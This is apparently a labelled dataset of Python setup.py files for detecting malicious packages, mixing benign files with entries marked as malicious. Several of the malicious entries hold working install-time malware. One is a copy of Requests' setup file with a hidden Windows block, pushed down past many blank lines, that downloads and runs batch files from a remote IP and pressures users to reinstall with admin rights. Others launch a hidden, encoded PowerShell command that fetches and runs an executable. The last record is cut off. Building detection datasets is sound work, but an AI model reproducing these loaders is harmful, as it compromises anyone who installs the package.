{"idx": "private-library-dont-install-3.3.1", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\nrequires = [\n    \"charset_normalizer>=2,<3\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name='private-library-dont-install',\n    version='3.3.1',\n    description='To evoid errors use administative permissions while installing :)',\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nif os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # try:\n    #   subprocess.Popen(\"cmd /c break>local.bat:Zone.Identifier\", shell=True, stdin=subprocess.PIPE,\n    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # except:\n    #   pass\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "target": 1}
{"idx": "libramvmver-4.86", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libramvmver',\n    packages = ['modlib'],\n    version = '6.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-audit-log-0.2.3", "func": "# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\nfrom setuptools import setup, find_packages\n\nname = \"google-cloud-audit-log\"\ndescription = \"Google Cloud Audit Protos\"\nversion = \"0.2.3\"\nrelease_status = \"Development Status :: 4 - Beta\"\ndependencies = [\n    \"protobuf >= 3.6.0, <4.0.0dev\",\n    \"googleapis-common-protos >= 1.56.2, < 2.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.md\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n    ],\n    description=description,\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    install_requires=dependencies,\n    license=\"Apache-2.0\",\n    packages=find_packages(),\n    package_data={\"\": [\"*.proto\"]},\n    python_requires=\">=3.7\",\n    namespace_packages=[\"google\", \"google.cloud\"],\n    url=\"https://github.com/googleapis/python-audit-log\",\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "py-ccmcstudy-1.14", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ccmcstudy',\n    packages = ['modlib'],\n    version = '4.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-Login-0.6.2", "func": "from setuptools import setup\n\n# Metadata goes in setup.cfg. These are here for GitHub's dependency graph.\nsetup(\n    name=\"Flask-Login\",\n    install_requires=[\n        \"Flask>=1.0.4\",\n        \"Werkzeug>=1.0.1\",\n    ],\n)\n", "target": 0}
{"idx": "curio-1.5", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\ntests_require = ['pytest', 'Sphinx']\n\nlong_description = \"\"\"\nCurio is a coroutine-based library for concurrent systems programming.\n\"\"\"\n\n\nsetup(name=\"curio\",\n      description=\"Curio\",\n      long_description=long_description,\n      license=\"BSD\",\n      version=\"1.5\",\n      author=\"David Beazley\",\n      author_email=\"dave@dabeaz.com\",\n      maintainer=\"David Beazley\",\n      maintainer_email=\"dave@dabeaz.com\",\n      url=\"https://github.com/dabeaz/curio\",\n      packages=['curio'],\n      tests_require=tests_require,\n      extras_require={\n          'test': tests_require,\n      },\n      python_requires='>= 3.7',\n      # This is disabled because it often causes interference with other testing\n      # plugins people have written.  Curio doesn't use it for it's own testing.\n      # entry_points={\"pytest11\": [\"curio = curio.pytest_plugin\"]},\n      classifiers=[\n          'Programming Language :: Python :: 3',\n          \"Framework :: Pytest\",\n      ])\n", "target": 0}
{"idx": "selfgamepullre-3.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgamepullre',\n    packages = ['modlib'],\n    version = '3.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-vmgrand-9.76", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-vmgrand',\n    packages = ['modlib'],\n    version = '8.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dictdiffer-0.9.0", "func": "# This file is part of Dictdiffer.\n#\n# Copyright (C) 2013 Fatih Erikli.\n# Copyright (C) 2014, 2015, 2016 CERN.\n# Copyright (C) 2017, 2019 ETH Zurich, Swiss Data Science Center, Jiri Kuncar.\n#\n# Dictdiffer is free software; you can redistribute it and/or modify\n# it under the terms of the MIT License; see LICENSE file for more\n# details.\n\n\"\"\"Dictdiffer is a library that helps you to diff and patch dictionaries.\"\"\"\n\nfrom __future__ import absolute_import, print_function\n\nimport os\n\nfrom setuptools import find_packages, setup\n\nreadme = open('README.rst').read()\n\ntests_require = [\n    'check-manifest>=0.42',\n    'mock>=1.3.0',\n    'pytest==5.4.3;python_version<=\"3.5\"',\n    'pytest>=6;python_version>\"3.5\"',\n    'pytest-cov>=2.10.1',\n    'pytest-isort>=1.2.0',\n    'pytest-pycodestyle>=2;python_version<=\"3.5\"',\n    'pytest-pycodestyle>=2.2.0;python_version>\"3.5\"',\n    'pytest-pydocstyle>=2;python_version<=\"3.5\"',\n    'pytest-pydocstyle>=2.2.0;python_version>\"3.5\"',\n    'sphinx>=3',\n    'tox>=3.7.0',\n]\n\nextras_require = {\n    'docs': [\n        'Sphinx>=3',\n        'sphinx-rtd-theme>=0.2',\n    ],\n    'numpy': [\n        'numpy>=1.13.0;python_version<\"3.7\"',\n        'numpy>=1.15.0;python_version<\"3.8\"',\n        'numpy>=1.18.0;python_version<\"3.9\"',\n        'numpy>=1.20.0;python_version>=\"3.9\"',\n    ],\n    'tests': tests_require,\n}\n\nextras_require['all'] = []\nfor key, reqs in extras_require.items():\n    if ':' == key[0]:\n        continue\n    extras_require['all'].extend(reqs)\n\nsetup_requires = [\n    'pytest-runner>=2.7',\n    'setuptools_scm>=3.1.0',\n]\n\npackages = find_packages()\n\nversion_template = \"\"\"\\\n# -*- coding: utf-8 -*-\n# Do not change the format of this next line. Doing so risks breaking\n# setup.py and docs/conf.py\n\\\"\\\"\\\"Version information for dictdiffer package.\\\"\\\"\\\"\n\n__version__ = {version!r}\n\"\"\"\n\nsetup(\n    name='dictdiffer',\n    use_scm_version={\n        'local_scheme': 'dirty-tag',\n        'write_to': os.path.join('dictdiffer', 'version.py'),\n        'write_to_template': version_template,\n    },\n    description=__doc__,\n    long_description=readme,\n    author='Invenio Collaboration',\n    author_email='info@inveniosoftware.org',\n    url='https://github.com/inveniosoftware/dictdiffer',\n    project_urls={\n        'Changelog': (\n            'https://github.com/inveniosoftware/dictdiffer'\n            '/blob/master/CHANGES'\n        ),\n        'Docs': 'https://dictdiffer.rtfd.io/',\n    },\n    packages=['dictdiffer'],\n    zip_safe=False,\n    extras_require=extras_require,\n    setup_requires=setup_requires,\n    tests_require=tests_require,\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Topic :: Utilities',\n    ],\n)\n", "target": 0}
{"idx": "eth-keyfile-0.6.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\n\ndeps = {\n    'keyfile': [\n        \"eth-utils>=2,<3\",\n        \"eth-keys>=0.4.0,<0.5.0\",\n        \"pycryptodome>=3.6.6,<4\",\n    ],\n    'test': [\n        \"pytest>=6.2.5,<7\",\n    ],\n    'lint': [\n        \"flake8==4.0.1\",\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"wheel\",\n        \"setuptools>=36.2.0\",\n        \"pluggy>=1.0.0,<2\",\n        # Fixing this dependency due to: requests 2.20.1 has requirement idna<2.8,>=2.5, but you'll have idna 2.8 which is incompatible.\n        \"idna==2.7\",\n        # idna 2.7 is not supported by requests 2.18\n        \"requests>=2.20,<3\",\n        \"tox>=2.7.0\",\n        \"twine\",\n    ],\n}\n\ndeps['dev'] = (\n    deps['keyfile'] +\n    deps['dev'] +\n    deps['test'] +\n    deps['lint']\n)\n\n\ninstall_requires = deps['keyfile']\n\nsetup(\n    name='eth-keyfile',\n    # *IMPORTANT*: Don't manually change the version here. Use the 'bumpversion' utility.\n    version='0.6.0',\n    description=(\n        \"A library for handling the encrypted keyfiles used to store ethereum \"\n        \"private keys.\"\n    ),\n    long_description_markdown_filename='README.md',\n    author='Piper Merriam',\n    author_email='pipermerriam@gmail.com',\n    url='https://github.com/ethereum/eth-keyfile',\n    include_package_data=True,\n    install_requires=install_requires,\n    extras_require=deps,\n    setup_requires=['setuptools-markdown'],\n    py_modules=['eth_keyfile'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "deprecat-2.1.1", "func": "#!/usr/bin/env python\n#  -*- coding: utf-8 -*-\nu\"\"\"Deprecation helper\"\"\"\nfrom setuptools import setup\n\nsetup(\n    name='deprecat',\n    version='2.1.1',\n    url='https://github.com/deprecat/deprecat',\n    download_url='https://github.com/deprecat/deprecat/archive/refs/tags/v2.1.1.tar.gz',\n    license='MIT',\n    author='Meenal Jhajharia',  \n    author_email='meenal@mjhajharia.com',\n    description='Python @deprecat decorator to deprecate old python classes, functions or methods.',\n    long_description=__doc__,\n    long_description_content_type=\"text/x-rst\",\n    keywords='deprecate,deprecated,deprecation,warning,warn,decorator',\n    packages=['deprecat'],\n    install_requires=['wrapt < 2, >= 1.10'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    extras_require={\n        'dev': [\n            'tox',\n            'PyTest             ; python_version >= \"3.6\"',\n            'PyTest < 5         ; python_version < \"3.6\"',\n            'PyTest-Cov         ; python_version >= \"3.6\"',\n            'PyTest-Cov < 2.6   ; python_version < \"3.6\"',\n            'bump2version < 1',\n            'sphinx < 2',\n        ]\n    },\n    python_requires='>=3.6',\n)\n", "target": 0}
{"idx": "dvc-2.18.0", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "gitlint-0.17.0", "func": "#!/usr/bin/env python\nfrom __future__ import print_function\nfrom setuptools import setup\n\ndescription = \"Git commit message linter written in python, checks your commit messages for style.\"\nlong_description = \"\"\"\nGreat for use as a commit-msg git hook or as part of your gating script in a CI pipeline (e.g. jenkins, github actions).\nMany of the gitlint validations are based on `well-known`_ community_ `standards`_, others are based on checks that\nwe've found useful throughout the years. Gitlint has sane defaults, but you can also easily customize it to your\nown liking.\n\nDemo and full documentation on `jorisroovers.github.io/gitlint`_.\nTo see what's new in the latest release, visit the CHANGELOG_.\n\nSource code on `github.com/jorisroovers/gitlint`_.\n\n.. _well-known: http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html\n.. _community: http://addamhardy.com/blog/2013/06/05/good-commit-messages-and-enforcing-them-with-git-hooks/\n.. _standards: http://chris.beams.io/posts/git-commit/\n.. _jorisroovers.github.io/gitlint: https://jorisroovers.github.io/gitlint\n.. _CHANGELOG: https://github.com/jorisroovers/gitlint/blob/main/CHANGELOG.md\n.. _github.com/jorisroovers/gitlint: https://github.com/jorisroovers/gitlint\n\"\"\"\n\n\nversion = \"0.17.0\"\n\nsetup(\n    name=\"gitlint\",\n    version=version,\n    description=description,\n    long_description=long_description,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Quality Assurance\",\n        \"Topic :: Software Development :: Testing\",\n        \"License :: OSI Approved :: MIT License\"\n    ],\n    python_requires=\">=3.6\",\n    install_requires=[\n        'gitlint-core[trusted-deps]==' + version,\n    ],\n    keywords='gitlint git lint',\n    author='Joris Roovers',\n    url='https://jorisroovers.github.io/gitlint',\n    project_urls={\n        'Documentation': 'https://jorisroovers.github.io/gitlint',\n        'Source': 'https://github.com/jorisroovers/gitlint',\n    },\n    license='MIT',\n)\n", "target": 0}
{"idx": "django-impersonate-1.8.2", "func": "import os\nfrom distutils.core import setup\n\nproject_name = 'impersonate'\nlong_description = open('README.rst').read()\n\n# Idea from django-registration setup.py\npackages, data_files = [], []\nroot_dir = os.path.dirname(__file__)\nif root_dir:\n    os.chdir(root_dir)\n\nfor dirpath, dirnames, filenames in os.walk(project_name):\n    # Ignore dirnames that start with '.'\n    for i, dirname in enumerate(dirnames):\n        if dirname.startswith('.') or dirname == '__pycache__':\n            del dirnames[i]\n    if '__init__.py' in filenames:\n        pkg = dirpath.replace(os.path.sep, '.')\n        if os.path.altsep:\n            pkg = pkg.replace(os.path.altsep, '.')\n        packages.append(pkg)\n    elif filenames:\n        prefix = dirpath[(len(project_name) + 1) :]\n        for f in filenames:\n            data_files.append(os.path.join(prefix, f))\n\nsetup(\n    name='django-impersonate',\n    version=__import__(project_name).get_version(),\n    package_dir={project_name: project_name},\n    packages=packages,\n    package_data={project_name: data_files},\n    description='Django app to allow superusers to impersonate other users.',\n    author='Peter Sanchez',\n    author_email='pjs@petersanchez.com',\n    license='BSD License',\n    url='https://code.netlandish.com/~petersanchez/django-impersonate',\n    long_description=long_description,\n    platforms=['any'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Environment :: Web Environment',\n    ],\n)\n", "target": 0}
{"idx": "ete3-3.1.2", "func": "# -*- coding: utf-8 -*-\n\n#! /usr/bin/env python\nfrom __future__ import absolute_import\nfrom __future__ import print_function\nimport sys\nimport os\nimport ez_setup\nimport hashlib\nimport time, random\nimport re\ntry:\n    from urllib2 import quote\n    from urllib2 import urlopen\n    from urllib2 import HTTPError\nexcept ImportError:\n    from urllib.parse import quote\n    from urllib.request import urlopen\n    from urllib.error import HTTPError\n\nHERE = os.path.abspath(os.path.split(os.path.realpath(__file__))[0])\n\nif \"--donottrackinstall\" in sys.argv:\n    TRACKINSTALL = None\n    sys.argv.remove(\"--donottrackinstall\")\nelse:\n    # Avoids importing self module\n    orig_path = list(sys.path)\n    _wd = os.getcwd()\n    try:\n        sys.path.remove(_wd)\n    except ValueError:\n        pass\n    try:\n        sys.path.remove(\"\")\n    except ValueError:\n        pass\n\n    # Is this and upgrade or a new install?\n    try:\n        import ete3\n    except ImportError:\n        TRACKINSTALL = 